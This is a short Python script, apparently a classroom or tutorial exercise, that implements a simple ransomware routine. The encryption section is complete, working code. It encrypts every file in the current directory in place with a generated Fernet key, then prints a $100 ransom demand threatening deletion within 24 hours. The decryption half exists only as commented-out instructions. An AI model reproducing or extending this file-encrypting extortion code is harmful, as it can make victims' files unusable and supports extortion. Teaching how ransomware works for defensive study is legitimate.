from cryptography.fernet import Fernet
import os


files = []

for path in os.listdir():
    if (path == "main.py" or path == "encryptedKey.key" or path == "decrypt.py"):
        continue    
    if os.path.isfile(path):
        files.append(path)

# Ask user to Choose an option: \n1. Encrypt \n2.Decrypt \n and save the integer user input to choice variable


# Check if choice is equal to 1 and run the Encryption code

    
    # Perform the Encryption code under if block
key = Fernet.generate_key()

with open("encryptedKey.key", "wb") as encryptedKey:
    encryptedKey.write(key)

for file in files:
    with open(file, "rb") as file1:
        rawData = file1.read()
    
    encryptedRawData = Fernet(key).encrypt(rawData)

    with open(file, "wb") as file2:
        file2.write(encryptedRawData)

print("👹👹👹👹 All of your files has been encrypted send me $100 or I'll delete them in 24 hours!! 👹👹👹👹")

# Check if choice is 2 and run the decryption code

    # Create variable secretePhrase and store the value "hello" or any other


    # Ask user to enter the valid phrase to decrypt the files


    # Check if secretPhrase do not match with the enteredPhrase

        # Print " 👹👹👹👹 Invalid Phrase try one more time or Pay me more 👹👹👹👹 "

    # Else:

        # Add try block

            # Read the encryptedKey.key file and store the content in secretKey variable.


            # Iterate the loop over the files list

                # Open the file in rb mode and store the content in rawData variable

                # Use Fernet(secretKey).decrypt(rawData) to decrypt and store the result in decryptRawData variable


                # Update the same file with decrypted data


            # Notify the message to the user "You have successfully recovered all the files!!"

        # Except pass 

  
